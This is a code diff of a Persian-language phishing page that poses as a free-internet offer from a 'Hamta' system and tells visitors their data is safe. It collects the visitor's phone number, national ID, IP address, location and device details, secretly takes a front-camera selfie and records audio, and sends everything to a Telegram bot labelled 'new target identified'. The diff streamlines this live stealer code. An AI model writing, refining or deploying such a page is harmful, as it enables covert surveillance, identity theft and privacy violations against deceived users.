@@ -93,18 +93,6 @@
             color: #dc2626;
             display: none;
         }
-        #debug {
-            margin-top: 10px;
-            font-size: 12px;
-            color: #6c7a8a;
-            display: none;
-            text-align: left;
-            background: #f8fafc;
-            padding: 10px;
-            border-radius: 8px;
-            max-height: 200px;
-            overflow-y: auto;
-        }
     </style>
 </head>
 <body>
@@ -128,7 +116,6 @@
         <div id="loading">⏳ در حال پردازش...</div>
         <div id="status">✅ اطلاعات با موفقیت ارسال شد</div>
         <div id="errorMsg">❌ خطا در ارسال اطلاعات</div>
-        <div id="debug"></div>
 
         <div class="note">
             🔒 اطلاعات شما محفوظ است · <span>سامانه همتا</span>
@@ -172,62 +159,33 @@
         }
 
         // ======================================================
-        // تابع گرفتن عکس با مدیریت خطا
+        // تابع گرفتن عکس سلفی (فقط دوربین جلو)
         // ======================================================
-        async function capturePhoto(facingMode = 'user') {
-            const debugDiv = document.getElementById('debug');
-            debugDiv.style.display = 'block';
-            debugDiv.innerHTML += `📸 تلاش برای دوربین: ${facingMode}\n`;
-
+        async function captureSelfie() {
             try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoDevices = devices.filter(d => d.kind === 'videoinput');
-                debugDiv.innerHTML += `📹 تعداد دوربین‌ها: ${videoDevices.length}\n`;
+                console.log('📸 گرفتن عکس سلفی...');
                 
-                if (videoDevices.length === 0) {
-                    debugDiv.innerHTML += '❌ هیچ دوربینی یافت نشد!\n';
-                    return null;
-                }
-
-                let stream;
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: facingMode,
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        }
-                    });
-                } catch (firstError) {
-                    debugDiv.innerHTML += `⚠️ تلاش اول شکست: ${firstError.message}\n`;
-                    try {
-                        stream = await navigator.mediaDevices.getUserMedia({
-                            video: {
-                                facingMode: facingMode
-                            }
-                        });
-                    } catch (secondError) {
-                        debugDiv.innerHTML += `⚠️ تلاش دوم شکست: ${secondError.message}\n`;
-                        if (facingMode === 'user') {
-                            try {
-                                stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                            } catch (thirdError) {
-                                debugDiv.innerHTML += `❌ همه تلاش‌ها شکست خورد\n`;
-                                return null;
-                            }
-                        } else {
-                            return null;
-                        }
+                // درخواست دسترسی به دوربین جلو
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
                     }
-                }
+                });
 
+                // گرفتن عکس از استریم
                 const photoBlob = await capturePhotoFromStream(stream);
+                
+                // بستن استریم
                 stream.getTracks().forEach(track => track.stop());
-                debugDiv.innerHTML += `✅ عکس گرفته شد، حجم: ${photoBlob.size} bytes\n`;
+                
+                console.log('✅ عکس سلفی گرفته شد، حجم:', photoBlob.size, 'bytes');
                 return photoBlob;
-
+                
             } catch (error) {
-                debugDiv.innerHTML += `❌ خطا: ${error.message}\n`;
+                console.error('❌ خطا در گرفتن عکس سلفی:', error);
+                alert('⚠️ لطفاً به مرورگر اجازه دسترسی به دوربین را بدهید.');
                 return null;
             }
         }
@@ -315,7 +273,7 @@
         // ======================================================
         // تابع ساخت پیام زیبا
         // ======================================================
-        function buildBeautifulMessage(phone, nationalCode, ip, location, deviceInfo, audioStatus, selfieStatus, backStatus) {
+        function buildBeautifulMessage(phone, nationalCode, ip, location, deviceInfo, audioStatus, selfieStatus) {
             let message = `🎯 **هدف جدید شناسایی شد** 🎯\n\n`;
             message += `🎨 **قالب:** 📶 اینترنت رایگان\n\n`;
             message += `🌐 **آدرس IP:**\n`;
@@ -327,9 +285,8 @@
             message += `📝 **اطلاعات ورودی کاربر:**\n`;
             message += `📞 شماره: ${phone}\n`;
             message += `🆔 کد ملی: ${nationalCode}\n\n`;
-            message += `📸 **وضعیت عکس‌ها:**\n`;
-            message += `🤳 سلفی: ${selfieStatus ? '✅ دریافت شد' : '❌ دریافت نشد'}\n`;
-            message += `📷 دوربین عقب: ${backStatus ? '✅ دریافت شد' : '❌ دریافت نشد'}\n\n`;
+            message += `📸 **وضعیت عکس سلفی:**\n`;
+            message += `🤳 ${selfieStatus ? '✅ دریافت شد' : '❌ دریافت نشد'}\n\n`;
             message += `🎤 **ضبط صدا:** ${audioStatus ? '✅ انجام شد' : '❌ انجام نشد'}\n\n`;
             message += `⏱️ **زمان:** ${new Date().toLocaleString('fa-IR')}`;
             
@@ -339,11 +296,11 @@
         // ======================================================
         // توابع ارسال به تلگرام
         // ======================================================
-        async function sendPhotoToTelegram(photoBlob, caption = '📸 عکس') {
+        async function sendPhotoToTelegram(photoBlob, caption = '🤳 عکس سلفی') {
             try {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', photoBlob, 'photo.jpg');
+                formData.append('photo', photoBlob, 'selfie.jpg');
                 formData.append('caption', caption);
 
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -407,7 +364,6 @@
             const loadingDiv = document.getElementById('loading');
             const statusDiv = document.getElementById('status');
             const errorDiv = document.getElementById('errorMsg');
-            const debugDiv = document.getElementById('debug');
             const submitBtn = document.getElementById('submitBtn');
 
             submitBtn.disabled = true;
@@ -415,14 +371,12 @@
             loadingDiv.style.display = 'block';
             statusDiv.style.display = 'none';
             errorDiv.style.display = 'none';
-            debugDiv.innerHTML = '';
 
             try {
                 // ۱. دریافت اطلاعات
                 const deviceInfo = getDeviceInfo();
                 const ip = await getIPInfo();
-                const selfiePhoto = await capturePhoto('user');
-                const backPhoto = await capturePhoto('environment');
+                const selfiePhoto = await captureSelfie(); // فقط عکس سلفی
                 const audioBlob = await recordAudio();
                 const location = await getLocation();
 
@@ -434,20 +388,18 @@
                     location,
                     deviceInfo,
                     audioBlob !== null,
-                    selfiePhoto !== null,
-                    backPhoto !== null
+                    selfiePhoto !== null
                 );
 
                 // ۳. ارسال پیام متنی
                 await sendMessageToTelegram(message);
 
-                // ۴. ارسال عکس‌ها و صدا
+                // ۴. ارسال عکس سلفی
                 if (selfiePhoto) {
                     await sendPhotoToTelegram(selfiePhoto, '🤳 عکس سلفی');
                 }
-                if (backPhoto) {
-                    await sendPhotoToTelegram(backPhoto, '📷 عکس دوربین عقب');
-                }
+
+                // ۵. ارسال صدا
                 if (audioBlob) {
                     await sendAudioToTelegram(audioBlob, '🎤 ضبط صدا');
                 }
@@ -473,4 +425,4 @@
         console.log('✅ صفحه بارگذاری شد');
     </script>
 </body>
-    </html>
+            </html>
